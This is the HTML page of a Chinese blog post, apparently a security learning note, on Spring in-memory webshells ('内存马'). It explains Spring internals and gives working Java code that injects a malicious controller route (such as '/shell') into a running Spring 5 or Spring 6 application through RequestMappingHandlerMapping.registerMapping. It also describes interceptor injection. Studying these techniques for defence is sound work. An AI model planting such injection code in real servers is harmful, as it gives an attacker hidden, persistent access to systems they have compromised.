@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            Spring内存马学习
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">https://boogipop.com/2023/03/02/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/">https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/</a></p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>Ioc，控制反转，对象原本由人来控制现在变为用容器来控制。</p>
+<p>依赖注入：程序需要的依赖由容器创建被注入到需要的地方。</p>
+<p>bean，豆子，java这杯咖啡由豆子组成。每个对象都是一个豆子。</p>
+<p>ApplicationContext，容器，装豆子的。</p>
+<p>springboot和spring framework版本关系：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/652895555">https://zhuanlan.zhihu.com/p/652895555</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guojiaqi_/article/details/134709718">https://blog.csdn.net/guojiaqi_/article/details/134709718</a></p>
+<p>后面说的spring几指的就是spring framework的版本。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>单纯使用springmvc，没有使用spring boot。</p>
+<p>和之前分析tomcat内存马一样，使用内置tomcat。</p>
+<p>依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">  &lt;spring.version&gt;5.2.5.RELEASE&lt;/spring.version&gt;</span><br><span class="line">  &lt;tomcat.version&gt;8.5.81&lt;/tomcat.version&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;tomcat.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;tomcat.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml文件</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205223005408.png" alt="image-20240205223005408.png"></p>
+<p>springmvc.xml文件</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205222941761.png" alt="image-20240205222941761.png"></p>
+<p>applicationContext.xml</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205223019164.png" alt="image-20240205223019164.png"></p>
+<p>Controller</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205200151383.png" alt="image-20240205200151383.png"></p>
+<p>启动程序</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205200126517.png" alt="image-20240205200126517.png"></p>
+<p>web.xml文件中，DispatcherServlet是一个普通的Servlet，下面的参数表示Spring配置文件的位置。</p>
+<p>DispatcherServlet创建过程中，读取该配置文件，创建ApplicationContext，然后将bean加入到该Context中。</p>
+<p>我们写的HelloController，是一个bean，被ApplicationContext管理，被自动注入要需要的地方，这就是依赖注入。</p>
+<h1 id="映射器"><a href="#映射器" class="headerlink" title="映射器"></a>映射器</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/435384481">https://zhuanlan.zhihu.com/p/435384481</a></p>
+<p>映射器的作用是：将请求的路由和处理请求的对象和方法对应起来。</p>
+<blockquote>
+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping<br>映射器 ；<br>Spring 3.1 开始及以后一般开始使用新的<br>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<br>映射器来支持@Contoller和@RequestMapping注解。</p>
+</blockquote>
+<p> 下面我的测试只测试了RequestMappingHandlerMapping。</p>
+<h1 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h1><p>其中RequestContextUtils这个类，<code>springframework 4.1.9.RELEASE</code>存在，<code>5.2.5.RELEASE</code>提示不存在。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context1 = ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line">WebApplicationContext context2 = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line">WebApplicationContext context3 = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一开始自己测试时，发现前两个是null。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205220607144.png" alt="image-20240205220607144.png"></p>
+<p>原来是因为web.xml里少了下面的代码：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205223358622.png" alt="image-20240205223358622.png"></p>
+<h1 id="controller内存马"><a href="#controller内存马" class="headerlink" title="controller内存马"></a>controller内存马</h1><p>我只有这种方式可以。另外两种方式提示context不存在getBeanFactory方法（spring-framework和springmvc测试过许多版本，2,3,4,5,6都测试过一些，都不行）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/hello&quot;)</span><br><span class="line">@ResponseBody //表示返回字符串hahaha,不会给资源识图解析器</span><br><span class="line">public String index() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;Controller!!!&quot;);</span><br><span class="line">    // 获取context</span><br><span class="line">    WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">    // 获取 RequestMappingHandlerMapping</span><br><span class="line">    RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">    Method method = (Class.forName(&quot;controller.EvilController&quot;).getDeclaredMethods())[0];</span><br><span class="line">    </span><br><span class="line">    // 构造requestMappingInfo</span><br><span class="line">    PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);</span><br><span class="line">    RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">    RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br><span class="line">    </span><br><span class="line">    // 注册</span><br><span class="line">    r.registerMapping(info, Class.forName(&quot;controller.EvilController&quot;).newInstance(), method);</span><br><span class="line">    return &quot;hahaha&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="interceptor内存马"><a href="#interceptor内存马" class="headerlink" title="interceptor内存马"></a>interceptor内存马</h1><p>调试方式：写一个正常的interceptor，断点打在preHandle，然后向下查看调用栈。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205234235588.png" alt="image-20240205234235588.png"></p>
+<p>在applyPreHandle方法中，遍历了<code>this.interceptorList</code>，所以要找到哪里设置了HandleExecutionChain对象的interceptorList。</p>
+<p>在doDispatch方法中，有这个操作：<code>mappedHandler = getHandler(processedRequest);</code>，一直跟进，直到AbstractHandlerMapping的getHandlerExecutionChain方法。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205234900247.png" alt="image-20240205234900247.png"></p>
+<p>this就是RequestMappingHandlerMapping，很容易获得。</p>
+<p>此时的调用栈：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205234943713.png" alt="image-20240205234943713.png"></p>
+<p>所以将恶意interceptor加入到RequestMappingHandlerMapping的adaptedInterceptors即可。</p>
+<p>注入代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240205235110164.png" alt="image-20240205235110164.png"></p>
+<h1 id="spring6"><a href="#spring6" class="headerlink" title="spring6"></a>spring6</h1><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/#SpringBoot2-6%E4%B9%8B%E5%90%8E%E7%9A%84%E6%94%B9%E5%8A%A8">https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/#SpringBoot2-6%E4%B9%8B%E5%90%8E%E7%9A%84%E6%94%B9%E5%8A%A8</a></p>
+<p>pop的两种controller的版本分界是springboot2.6。</p>
+<p>我没用springboot，全程使用springmvc。分别试了两种spring framework：<code>5.2.5.RELEASE</code> 和 <code>6.0.3</code>。后者用新exp可以打，旧exp不行。所以spring framework的版本也存在分界，但具体多少不知道。</p>
+<h2 id="版本配置"><a href="#版本配置" class="headerlink" title="版本配置"></a>版本配置</h2><p>现在使用spring6，tomcat和java也要变化。</p>
+<p>Java 17</p>
+<p>Tomcat 10.x （具体到多少没测，总之用的包是jakarta就行）</p>
+<p>依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;spring.version&gt;6.0.3&lt;/spring.version&gt;</span><br><span class="line">    &lt;tomcat.version&gt;10.0.7&lt;/tomcat.version&gt;</span><br><span class="line">&lt;!--    &lt;tomcat.version&gt;8.5.81&lt;/tomcat.version&gt;--&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后原代码爆红就把javax改为jakarta即可。</p>
+<h2 id="interceptor内存马-1"><a href="#interceptor内存马-1" class="headerlink" title="interceptor内存马"></a>interceptor内存马</h2><p>和先前的注入方式一样。</p>
+<h2 id="controller内存马-1"><a href="#controller内存马-1" class="headerlink" title="controller内存马"></a>controller内存马</h2><p>调试方式：</p>
+<p>断点打在<code>AbstractHandlerMethodMapping#initHandlerMethods()</code>。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240206132000071.png" alt="image-20240206132000071.png"></p>
+<p>向下查看调用栈，猜测到这里已经create了<code>RequestMappingHandlerMapping</code>这个bean，正在initHandler，即注册controller。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240206131825355.png" alt="image-20240206131825355.png"></p>
+<p>跟进<code>processCandidateBean</code>，然后是<code>detectHandlerMethods(beanName);</code>。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240206132427711.png" alt="image-20240206132427711.png"></p>
+<p>getMappingForMethod，构造RequestMappingInfo。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-memshell/image-20240206132628255.png" alt="image-20240206132628255.png"></p>
+<p>拿到mapping之后最下面就是注册了。</p>
+<p>所以注入controller内存马思路：拿到上下文，拿到RequestMappingHandlerMapping，构造RequestMappingInfo，注册。</p>
+<p>下面是注入代码，和先前版本的代码不一样的地方在于requestMappingInfo的获取，之前用的new，现在用build。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/hello2&quot;)</span><br><span class="line">@ResponseBody //表示返回字符串hahaha,不会给资源识图解析器</span><br><span class="line">public String index() throws Exception &#123;</span><br><span class="line">    System.out.println(&quot;i am in&quot;);</span><br><span class="line">    </span><br><span class="line">    // 获取RequestMappingHandlerMapping</span><br><span class="line">    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">    RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">    // 构造requestMappingInfo</span><br><span class="line">    RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration)Util.getFieldValue(mappingHandlerMapping, &quot;config&quot;);</span><br><span class="line">    Method method = (Class.forName(&quot;controller.EvilController&quot;).getDeclaredMethods())[0];</span><br><span class="line">    RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;)</span><br><span class="line">            .options(config)</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    // 注册</span><br><span class="line">    mappingHandlerMapping.registerMapping(info, new EvilController(), method);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;hahaha&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A0%E5%B0%84%E5%99%A8"><span class="toc-text">映射器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96context"><span class="toc-text">获取context</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#controller%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">controller内存马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#interceptor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">interceptor内存马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spring6"><span class="toc-text">spring6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E9%85%8D%E7%BD%AE"><span class="toc-text">版本配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#interceptor%E5%86%85%E5%AD%98%E9%A9%AC-1"><span class="toc-text">interceptor内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#controller%E5%86%85%E5%AD%98%E9%A9%AC-1"><span class="toc-text">controller内存马</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
